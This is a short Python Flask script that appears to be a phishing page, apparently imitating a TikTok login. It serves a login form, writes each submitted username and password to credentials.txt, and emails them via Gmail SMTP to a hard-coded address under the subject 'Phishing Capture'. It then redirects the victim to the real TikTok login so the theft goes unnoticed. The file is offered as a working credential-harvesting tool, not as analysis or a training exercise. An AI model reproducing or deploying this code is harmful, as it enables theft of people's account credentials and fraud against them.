from flask import Flask, render_template, request, redirect
import smtplib

app = Flask(__name__)

# Replace with controlled email
EMAIL_ADDRESS = "mwananchihuslerloans2@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Use Gmail App Passwords
TO_EMAIL = "mwananchihuslerloans2@gmail.com"

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Save to file
    with open("credentials.txt", "a") as f:
        f.write(f"{username} | {password}\n")

    # Send email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            subject = "Phishing Capture"
            body = f"Username: {username}\nPassword: {password}"
            msg = f"Subject: {subject}\n\n{body}"
            smtp.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg)
    except Exception as e:
        print(f"Email failed: {e}")

    return redirect("https://www.tiktok.com/login")

if __name__ == "__main__":
    app.run(debug=True)
import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
